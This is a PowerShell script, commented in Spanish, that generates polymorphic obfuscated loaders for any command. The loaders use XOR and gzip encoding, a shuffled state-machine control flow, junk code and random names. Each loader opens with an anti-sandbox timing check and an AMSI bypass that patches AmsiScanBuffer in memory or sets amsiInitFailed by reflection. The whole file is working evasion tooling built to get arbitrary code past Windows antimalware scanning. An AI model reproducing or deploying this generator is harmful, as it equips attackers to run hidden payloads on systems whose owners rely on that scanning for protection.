#requires -Version 5.1
using namespace System.Text
using namespace System.IO
using namespace System.Security.Cryptography
using namespace System.Collections.Generic

function New-PolymorphicPayload {
    [CmdletBinding()]
    param(
        [Parameter(Position=0, HelpMessage="Comando a ofuscar y ejecutar")]
        [string]$PayloadCommand = "Write-Host 'Ejecución polimórfica exitosa' -ForegroundColor Cyan; Get-Date",
        [ValidateRange(10,100)][int]$JunkIntensity = 30,
        [switch]$NoAmsiBypass
    )

    # ==================================================================
    # 1. MOTOR DE ENTROPÍA CRIPTOGRÁFICA (CSPRNG + Rejection Sampling)
    # ==================================================================
    class EntropyEngine {
        hidden [RandomNumberGenerator]$_rng
        hidden [byte[]]$_alphabet
        hidden [int]$_alphaLen
        hidden [byte[]]$_intBuf

        EntropyEngine() {
            $this._rng = [RandomNumberGenerator]::Create()
            $this._alphabet = [Encoding]::ASCII.GetBytes('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
            $this._alphaLen = $this._alphabet.Length
            $this._intBuf = [byte[]]::new(4)
        }

        [string] GetName([int]$Length = 10) {
            if ($Length -lt 2) { $Length = 2 }
            [byte[]]$buf = [byte[]]::new($Length * 3)
            $this._rng.GetBytes($buf)
            $sb = [StringBuilder]::new($Length)
            for ($i = 0; $sb.Length -lt $Length -and $i -lt $buf.Length; $i++) {
                # Rejection sampling: descarta bytes en zona de sesgo [252,255]
                if ($buf[$i] -lt (256 - (256 % $this._alphaLen))) {
                    [void]$sb.Append([char]$this._alphabet[$buf[$i] % $this._alphaLen])
                }
            }
            while ($sb.Length -lt $Length) {
                [byte[]]$b = [byte[]]::new(1); $this._rng.GetBytes($b)
                [void]$sb.Append([char]$this._alphabet[$b[0] % $this._alphaLen])
            }
            return $sb.ToString()
        }

        [byte] GetByte() {
            [byte[]]$b = [byte[]]::new(1); $this._rng.GetBytes($b); return $b[0]
        }

        [int] GetInt32([int]$MaxValue) {
            if ($MaxValue -le 1) { return 0 }
            [int]$limit = [int]::MaxValue - ([int]::MaxValue % $MaxValue)
            [int]$val = 0
            do {
                $this._rng.GetBytes($this._intBuf)
                $val = [BitConverter]::ToInt32($this._intBuf, 0) -band 0x7FFFFFFF
            } while ($val -ge $limit)
            return $val % $MaxValue
        }

        [bool] GetBool() { return ($this.GetByte() -band 1) -eq 1 }
        [void] Dispose() { if ($this._rng) { $this._rng.Dispose(); $this._rng = $null } }
    }

    $rng = [EntropyEngine]::new()
    try {
        # ==================================================================
        # 2. NAMESPACE CRIPTOGRÁFICO DE VARIABLES
        # ==================================================================
        $V = @{
            State    = $rng.GetName(10)
            Payload  = $rng.GetName(10)
            XorKey   = $rng.GetName(8)
            Decoded  = $rng.GetName(10)
            Result   = $rng.GetName(10)
            Mem      = $rng.GetName(8)
            Gz       = $rng.GetName(8)
            Reader   = $rng.GetName(8)
            Timer    = $rng.GetName(8)
            Hash     = $rng.GetName(8)
            JunkVars = [string[]]::new(12)
        }
        for ($i = 0; $i -lt $V.JunkVars.Length; $i++) { $V.JunkVars[$i] = $rng.GetName(8) }

        # ==================================================================
        # 3. PIPELINE DE CODIFICACIÓN (Zero-copy, sin pipeline de objetos)
        # ==================================================================
        $payloadBytes = [Encoding]::Unicode.GetBytes($PayloadCommand)
        $xorKey = 0
        do { $xorKey = $rng.GetByte() } while ($xorKey -in @(0, 255))

        $useGzip = $rng.GetBool()
        [byte[]]$encodedBytes = $null

        if ($useGzip) {
            $ms = [MemoryStream]::new($payloadBytes.Length + 32)
            $gzs = [IO.Compression.GzipStream]::new($ms, [IO.Compression.CompressionMode]::Compress, $true)
            $gzs.Write($payloadBytes, 0, $payloadBytes.Length)
            $gzs.Dispose()
            $encodedBytes = $ms.ToArray()
            $ms.Dispose()
            for ($i = 0; $i -lt $encodedBytes.Length; $i++) {
                $encodedBytes[$i] = $encodedBytes[$i] -bxor $xorKey
            }
        } else {
            $encodedBytes = [byte[]]::new($payloadBytes.Length)
            [Buffer]::BlockCopy($payloadBytes, 0, $encodedBytes, 0, $payloadBytes.Length)
            for ($i = 0; $i -lt $encodedBytes.Length; $i++) {
                $encodedBytes[$i] = $encodedBytes[$i] -bxor $xorKey
            }
        }
        $b64Payload = [Convert]::ToBase64String($encodedBytes)

        # ==================================================================
        # 4. CONTROL FLOW FLATTENING (Fisher-Yates criptográfico puro)
        # ==================================================================
        $states = [int[]](0..5)
        for ($i = $states.Length - 1; $i -gt 0; $i--) {
            $j = $rng.GetInt32($i + 1)
            $tmp = $states[$i]; $states[$i] = $states[$j]; $states[$j] = $tmp
        }

        $transitions = @{}
        for ($i = 0; $i -lt $states.Length; $i++) {
            $transitions[$states[$i]] = if ($i -lt ($states.Length - 1)) { $states[$i + 1] } else { -1 }
        }

        # ==================================================================
        # 5. GENERACIÓN DE CÓDIGO BASURA (Distribución uniforme O(1))
        # ==================================================================
        $junkCount = [Math]::Ceiling($JunkIntensity / 10.0)
        $junkMap = [Dictionary[int, List[string]]]::new()

        for ($i = 0; $i -lt $junkCount; $i++) {
            $targetState = $states[$rng.GetInt32($states.Length)]
            if (-not $junkMap.ContainsKey($targetState)) {
                $junkMap[$targetState] = [List[string]]::new()
            }
            $jType = $rng.GetInt32(5)
            $jVar  = $V.JunkVars[$rng.GetInt32($V.JunkVars.Length)]
            $line = switch ($jType) {
                0 { "`$$jVar = [math]::Sin($(($rng.GetByte() % 628) / 100.0)) + [math]::Cos($(($rng.GetByte() % 628) / 100.0))" }
                1 { "`$$jVar = [guid]::NewGuid().ToString('N')" }
                2 { "`$$jVar = [Environment]::TickCount" }
                3 { "[System.Threading.Thread]::Yield() | Out-Null" }
                4 { "`$$jVar = $($rng.GetByte()) -bxor $($rng.GetByte())" }
            }
            $junkMap[$targetState].Add($line)
        }

        # ==================================================================
        # 6. MÁQUINA DE ESTADOS: HANDLERS CORE (Lógica pura, sin transición)
        # ==================================================================
        $coreHandlers = @{}

        # Estado 0: Init (vacío)
        $coreHandlers[0] = [List[string]]::new()

        # Estado 1: Anti-Sandbox (PoW criptográfico con cadena de hashes)
        $coreHandlers[1] = [List[string]]::new()
        $coreHandlers[1].Add("`$$($V.Timer) = [System.Diagnostics.Stopwatch]::StartNew()")
        $coreHandlers[1].Add("`$$($V.Hash) = [byte[]]::new(64)")
        $coreHandlers[1].Add("`$sha = [System.Security.Cryptography.SHA256]::Create()")
        $coreHandlers[1].Add("for (`$k = 0; `$k -lt 2000; `$k++) { `$$($V.Hash) = `$sha.ComputeHash(`$$($V.Hash)) }")
        $coreHandlers[1].Add("`$sha.Dispose()")
        $coreHandlers[1].Add("if (`$$($V.Timer).Elapsed.TotalMilliseconds -lt 30) { exit }")

        # Estado 2: Decodificación
        $coreHandlers[2] = [List[string]]::new()
        $coreHandlers[2].Add("`$$($V.Payload) = [Convert]::FromBase64String('$b64Payload')")
        $coreHandlers[2].Add("`$$($V.XorKey) = $xorKey")
        $coreHandlers[2].Add("`$$($V.Decoded) = [byte[]]::new(`$$($V.Payload).Length)")
        $coreHandlers[2].Add("for (`$i = 0; `$i -lt `$$($V.Payload).Length; `$i++) { `$$($V.Decoded)[`$i] = `$$($V.Payload)[`$i] -bxor `$$($V.XorKey) }")
        if ($useGzip) {
            $coreHandlers[2].Add("`$$($V.Mem) = [MemoryStream]::new(`$$($V.Decoded))")
            $coreHandlers[2].Add("`$$($V.Gz) = [IO.Compression.GzipStream]::new(`$$($V.Mem), [IO.Compression.CompressionMode]::Decompress)")
            $coreHandlers[2].Add("`$$($V.Reader) = [StreamReader]::new(`$$($V.Gz))")
            $coreHandlers[2].Add("`$$($V.Result) = `$$($V.Reader).ReadToEnd()")
            $coreHandlers[2].Add("`$$($V.Reader).Dispose(); `$$($V.Gz).Dispose(); `$$($V.Mem).Dispose()")
        } else {
            $coreHandlers[2].Add("`$$($V.Result) = [Encoding]::Unicode.GetString(`$$($V.Decoded))")
        }

        # Estado 3: Ejecución
        $coreHandlers[3] = [List[string]]::new()
        $coreHandlers[3].Add("& ([scriptblock]::Create(`$$($V.Result)))")

        # Estado 4: Limpieza
        $coreHandlers[4] = [List[string]]::new()
        $coreHandlers[4].Add("`$$($V.Payload) = `$$($V.Decoded) = `$$($V.Result) = `$null")
        $coreHandlers[4].Add("[System.GC]::Collect(0, [System.GCCollectionMode]::Optimized, `$false)")

        # Estado 5: Terminal (sin core lines, solo transición de salida)

        # ==================================================================
        # 7. AMSI BYPASS METAMÓRFICO (P/Invoke vs Reflexión, elegido por CSPRNG)
        # ==================================================================
        $amsiBlock = [StringBuilder]::new(2048)

        if (-not $NoAmsiBypass) {
            $amsiVariant = $rng.GetInt32(2)  # 0 = P/Invoke directo, 1 = Reflexión .NET

            if ($amsiVariant -eq 0) {
                # VARIANTE A: P/Invoke a kernel32 -> amsi.dll (sin telemetría CLR)
                $className = $rng.GetName(12)
                $amsiBlock.AppendLine("`$amsiCode = @'")
                $amsiBlock.AppendLine("using System;")
                $amsiBlock.AppendLine("using System.Runtime.InteropServices;")
                $amsiBlock.AppendLine("public class $className {")
                $amsiBlock.AppendLine("    [DllImport(`"kernel32.dll`")] public static extern IntPtr LoadLibrary(string lpFileName);")
                $amsiBlock.AppendLine("    [DllImport(`"kernel32.dll`")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);")
                $amsiBlock.AppendLine("    [DllImport(`"kernel32.dll`")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);")
                $amsiBlock.AppendLine("    public static void P() {")
                $amsiBlock.AppendLine("        IntPtr h = LoadLibrary(`"amsi.dll`");")
                $amsiBlock.AppendLine("        IntPtr a = GetProcAddress(h, `"AmsiScanBuffer`");")
                $amsiBlock.AppendLine("        uint old;")
                $amsiBlock.AppendLine("        VirtualProtect(a, 5, 0x40, out old);")
                $amsiBlock.AppendLine("        Marshal.Copy(new byte[]{0x48, 0x31, 0xC0, 0xC3}, 0, a, 4);")  # xor rax,rax; ret (x64)
                $amsiBlock.AppendLine("        VirtualProtect(a, 5, old, out old);")
                $amsiBlock.AppendLine("    }")
                $amsiBlock.AppendLine("}")
                $amsiBlock.AppendLine("'@")
                $amsiBlock.AppendLine("Add-Type -TypeDefinition `$amsiCode -Language CSharp -PassThru | Out-Null")
                $amsiBlock.AppendLine("[$className]::P()")
            } else {
                # VARIANTE B: Reflexión .NET (fallback, mantiene compatibilidad)
                $amsiBlock.AppendLine('$amsiUtils = [Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')')
                $amsiBlock.AppendLine('if ($amsiUtils) {')
                $amsiBlock.AppendLine('    $f = $amsiUtils.GetField(''amsiInitFailed'', [System.Reflection.BindingFlags]''NonPublic,Static'')')
                $amsiBlock.AppendLine('    if ($f) { $f.SetValue($null, $true) }')
                $amsiBlock.AppendLine('}')
            }
        }

        # ==================================================================
        # 8. METAMORFISMO DE INSTRUCCIONES DEL LOADER
        # ==================================================================
        # Selección criptográfica de la variante de control de flujo.
        # Cada variante produce un CFG (Control Flow Graph) topológicamente
        # distinto, aumentando la entropía estructural del payload generado.
        $loaderVariant = $rng.GetInt32(4)
        $script = [StringBuilder]::new(8192)

        # Helper: ensambla un handler core + junk + transición
        function Assemble-Handler {
            param([int]$Sid, [string]$TransitionCmd)
            $lines = [List[string]]::new()
            if ($junkMap.ContainsKey($Sid)) {
                foreach ($jl in $junkMap[$Sid]) { $lines.Add($jl) }
            }
            foreach ($cl in $coreHandlers[$Sid]) { $lines.Add($cl) }
            if ($TransitionCmd) { $lines.Add($TransitionCmd) }
            return ($lines -join "`n        ")
        }

        switch ($loaderVariant) {
            # ------------------------------------------------------------------
            # VARIANTE 0: Do-While + Switch (break label) [CFG: Ciclo centralizado]
            # ------------------------------------------------------------------
            0 {
                $loopLabel = $rng.GetName(6)
                $script.AppendLine($amsiBlock.ToString())
                $script.AppendLine("`$$($V.State) = $($states[0])")
                $script.AppendLine(":$loopLabel do {")
                $script.AppendLine("    `$current = `$$($V.State)")
                $script.AppendLine("    switch (`$current) {")

                foreach ($s in $states) {
                    $trans = if ($transitions[$s] -eq -1) { "break $loopLabel" } else { "`$$($V.State) = $($transitions[$s])" }
                    $script.AppendLine("        $s {")
                    $handlerText = Assemble-Handler -Sid $s -TransitionCmd $trans
                    $indented = ($handlerText -split "`r?`n" | ForEach-Object { "            $_" }) -join "`n"
                    $script.AppendLine($indented)
                    $script.AppendLine("        }")
                }

                $script.AppendLine("    }")
                $script.AppendLine("} while (`$true)")
            }

            # ------------------------------------------------------------------
            # VARIANTE 1: While-True + If-Elseif Chain [CFG: Árbol de decisiones]
            # ------------------------------------------------------------------
            1 {
                $script.AppendLine($amsiBlock.ToString())
                $script.AppendLine("`$$($V.State) = $($states[0])")
                $script.AppendLine("while (`$true) {")
                $script.AppendLine("    `$current = `$$($V.State)")

                for ($i = 0; $i -lt $states.Length; $i++) {
                    $s = $states[$i]
                    $keyword = if ($i -eq 0) { "if" } else { "elseif" }
                    $trans = if ($transitions[$s] -eq -1) { "break" } else { "`$$($V.State) = $($transitions[$s])" }
                    $handlerText = Assemble-Handler -Sid $s -TransitionCmd $trans
                    $indented = ($handlerText -split "`r?`n" | ForEach-Object { "        $_" }) -join "`n"
                    $script.AppendLine("    $keyword (`$current -eq $s) {")
                    $script.AppendLine($indented)
                    $script.AppendLine("    }")
                }

                $script.AppendLine("}")
            }

            # ------------------------------------------------------------------
            # VARIANTE 2: For-Infinite + Array Dispatch [CFG: Tabla de saltos]
            # ------------------------------------------------------------------
            2 {
                $dispatchVar = $rng.GetName(8)
                $script.AppendLine($amsiBlock.ToString())
                $script.AppendLine("`$$($V.State) = $($states[0])")
                $script.AppendLine("`$$dispatchVar = @{")

                foreach ($s in $states) {
                    $trans = if ($transitions[$s] -eq -1) { "`$$($V.State) = -1; return" } else { "`$$($V.State) = $($transitions[$s])" }
                    $handlerText = Assemble-Handler -Sid $s -TransitionCmd $trans
                    $indented = ($handlerText -split "`r?`n" | ForEach-Object { "        $_" }) -join "`n"
                    $script.AppendLine("    $s = {")
                    $script.AppendLine($indented)
                    $script.AppendLine("    }")
                }

                $script.AppendLine("}")
                $script.AppendLine("for (;;) {")
                $script.AppendLine("    if (`$$($V.State) -eq -1) { break }")
                $script.AppendLine("    & `$$dispatchVar[`$$($V.State)]")
                $script.AppendLine("}")
            }

            # ------------------------------------------------------------------
            # VARIANTE 3: Recursión con Trampolín [CFG: Cadena de llamadas]
            # ------------------------------------------------------------------
            3 {
                $funcName = $rng.GetName(10)
                $script.AppendLine($amsiBlock.ToString())
                $script.AppendLine("function $funcName {")
                $script.AppendLine("    param([int]`$c)")
                $script.AppendLine("    if (`$c -eq -1) { return }")
                $script.AppendLine("    switch (`$c) {")

                foreach ($s in $states) {
                    $trans = if ($transitions[$s] -eq -1) { "return" } else { "$funcName $($transitions[$s])" }
                    $handlerText = Assemble-Handler -Sid $s -TransitionCmd $trans
                    $indented = ($handlerText -split "`r?`n" | ForEach-Object { "            $_" }) -join "`n"
                    $script.AppendLine("        $s {")
                    $script.AppendLine($indented)
                    $script.AppendLine("        }")
                }

                $script.AppendLine("    }")
                $script.AppendLine("}")
                $script.AppendLine("$funcName $($states[0])")
            }
        }

        return $script.ToString()
    }
    finally {
        $rng.Dispose()
    }
}